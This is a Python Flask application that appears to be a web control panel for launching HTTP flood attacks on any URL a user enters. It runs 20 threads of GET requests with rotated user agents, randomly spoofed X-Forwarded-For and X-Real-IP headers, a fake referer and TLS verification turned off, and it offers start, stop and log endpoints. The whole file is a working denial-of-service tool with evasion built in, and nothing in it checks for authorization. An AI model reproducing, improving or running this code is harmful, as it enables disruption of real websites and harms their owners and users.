from flask import Flask, render_template, request, jsonify, session
import requests
import random
import threading
import time
import concurrent.futures

app = Flask(__name__)
app.secret_key = 'fsociety_hardcore_2024'

# USER AGENTS MASIVOS
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
]

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_id_counter = 0

    def generate_attack_id(self):
        self.attack_id_counter += 1
        return f"attack_{self.attack_id_counter}"

attack_manager = AttackManager()

def send_single_request(target_url, request_num):
    """Envía una sola request"""
    try:
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Referer": "https://www.google.com/",
            "DNT": "1"
        }
        
        response = requests.get(target_url, headers=headers, timeout=5, verify=False)
        return f"🔥 Request {request_num} | Status: {response.status_code} | Target: {target_url}"
    
    except Exception as e:
        return f"💥 Request {request_num} | Error: {type(e).__name__} | Target: {target_url}"

def run_attack(target_url, num_requests, attack_id, log_callback):
    """Ejecuta el ataque con threading"""
    max_workers = 20  # Threads simultáneos
    
    def worker(batch_requests):
        for req_num in batch_requests:
            if attack_id not in attack_manager.active_attacks:
                break
                
            message = send_single_request(target_url, req_num)
            log_callback(message)
            time.sleep(0.1)  # Pequeño delay entre requests

    start_time = time.time()
    
    # Dividir requests entre workers
    requests_per_worker = max(1, num_requests // max_workers)
    all_requests = list(range(1, num_requests + 1))
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Dividir en batches
        batches = [all_requests[i:i + requests_per_worker] for i in range(0, num_requests, requests_per_worker)]
        
        # Ejecutar todos los batches
        futures = [executor.submit(worker, batch) for batch in batches]
        concurrent.futures.wait(futures)
    
    elapsed_time = time.time() - start_time
    log_callback(f"✅ ATTACK COMPLETED - Time: {elapsed_time:.2f}s - Total Requests: {num_requests}")

def start_attack_thread(target_url, num_requests, attack_id, log_callback):
    """Inicia el ataque en un thread separado"""
    thread = threading.Thread(target=run_attack, args=(target_url, num_requests, attack_id, log_callback))
    thread.daemon = True
    thread.start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target_url = data.get('target_url', '').strip()
    num_requests = int(data.get('num_requests', 100))
    
    if not target_url:
        return jsonify({'error': 'Target URL required'}), 400
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    attack_id = attack_manager.generate_attack_id()
    
    if 'attack_logs' not in session:
        session['attack_logs'] = {}
    
    session['attack_logs'][attack_id] = []
    session.modified = True
    
    def log_callback(message):
        if attack_id in session.get('attack_logs', {}):
            session['attack_logs'][attack_id].append(message)
            # Mantener solo últimos 100 logs
            if len(session['attack_logs'][attack_id]) > 100:
                session['attack_logs'][attack_id] = session['attack_logs'][attack_id][-100:]
            session.modified = True
    
    attack_manager.active_attacks[attack_id] = {
        'target_url': target_url,
        'num_requests': num_requests,
        'start_time': time.time()
    }
    
    start_attack_thread(target_url, num_requests, attack_id, log_callback)
    
    return jsonify({
        'attack_id': attack_id,
        'message': '🔥 ATTACK STARTED!'
    })

@app.route('/get_logs/<attack_id>')
def get_logs(attack_id):
    logs = session.get('attack_logs', {}).get(attack_id, [])
    return jsonify({'logs': logs})

@app.route('/stop_attack/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    if attack_id in attack_manager.active_attacks:
        del attack_manager.active_attacks[attack_id]
    return jsonify({'message': 'Attack stopped'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
